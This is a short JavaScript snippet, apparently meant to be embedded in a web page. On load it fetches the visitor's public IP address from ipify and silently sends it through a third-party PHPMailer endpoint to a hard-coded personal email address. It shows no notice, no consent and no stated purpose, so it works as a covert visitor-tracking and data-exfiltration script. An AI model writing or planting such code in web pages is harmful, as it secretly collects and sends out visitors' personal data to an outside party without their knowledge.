function getIP(json) {
  console.log(json.ip);
  var ip = json.ip;
  var url = "https://api.xhuaxs.com/phpmailer/api.php?adress=jun.csy@qq.com&title=IP:" + ip + "&content=2003";
  var xhr = new XMLHttpRequest();
  xhr.open("GET", url);
  xhr.send();
}
var script = document.createElement("script");
script.src = "https://api.ipify.org?format=jsonp&callback=getIP";
document.getElementsByTagName("head")[0].appendChild(script);